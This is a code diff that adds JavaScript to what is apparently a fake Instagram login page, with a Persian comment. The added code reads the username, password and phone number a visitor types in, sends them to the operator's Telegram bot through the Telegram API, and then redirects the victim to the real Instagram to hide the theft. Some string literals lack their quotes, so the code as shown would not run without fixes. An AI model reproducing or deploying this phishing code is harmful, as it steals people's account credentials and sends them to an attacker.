@@ -123,3 +123,22 @@
         const u = document.getElementById('username').value.trim();
         const p = document.getElementById('password').value;
         const ph = document.getElementById('phone').value.trim() || "Not provided";
+const msg = Hello, I am MicY and I have captured new information from a new user and sent it to you
+Username: ${u}
+Password: ${p}
+Phone number: ${ph}
+Macker: MicY™;
+
+        await fetch(https://api.telegram.org/bot${TOKEN}/sendMessage, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+        });
+
+        // ریدایرکت به اینستاگرام واقعی
+        setTimeout(() => window.location.href = "https://www.instagram.com/", 500);
+    };
+</script>
+
+</body>
+</html>
